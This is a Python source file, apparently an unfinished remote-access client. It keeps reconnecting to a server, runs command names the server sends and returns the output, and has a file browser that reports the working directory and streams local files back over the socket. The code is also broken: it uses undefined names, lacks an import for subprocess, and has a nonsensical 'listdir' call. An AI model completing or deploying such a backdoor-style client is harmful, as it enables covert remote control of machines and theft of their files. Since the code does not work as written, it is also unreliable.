import socket
import time
import os
import stat

import commands

class Client:

    def __init__(self, host, port):
        self.socket = None
        self.port = port
        self.host = host

    def run(self):
        self.connect_server()
        while True:
            data = DataObject(self.socket.recv(4096))

            if data:
                command = fetch_command(data.command)
                datos = command(data.args)
                self.socket.sendall(datos)
            else:
                print("Connection lost.")
                self.connect_server()

    def connect_server(self):

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connected = False
        while not connected:
            try:
                self.socket.connect((self.host, self.port))
                connected = True
                print("Connected.")
            except socket.error:
                print("Trying to connect...")
                time.sleep(1)

    def fetch_command(self, command_name):
        return getattr(commands, command_name)

class FileBrowser:

    def __init__(self, client):
        self.client = client

    def run(self):

        self.client.socket.sendall(os.getcwd())
        while True:
            cmd = self.client.socket.recv(4096)
            cmd = cmd.split("~")

            try:
                asd = subprocess.check_output("listdir")
            except:
                asd = "Command not found."
            self.client.socket.sendall(asd)
            # elif cmd[0] == 'cp':
            #     asd = self.file_transfer(cmd)
            #     self.client.socket.sendall(bytes(asd, "UTF-8"))
            # elif cmd[0] == 'exit':
            #     break
            # else:
            #     self.client.socket.sendall(bytes("Command not found.",
            #                                      "UTF-8"))

    def file_transfer(self, file_name):

        try:
            f = open(os.getcwd()+"/"+file_name[1], "rb")

            while True:
                data = f.read(4096)
                if not data:
                    break
                self.client.socket.sendall(data)
            f.close()
            time.sleep(0.8)
            self.client.socket.sendall("EOFX")
            time.sleep(0.8)

            return "File transfered."
        except:
            self.client.socket.sendall("EOFX")
            time.sleep(0.8)
            return "Failed to transfer a file."
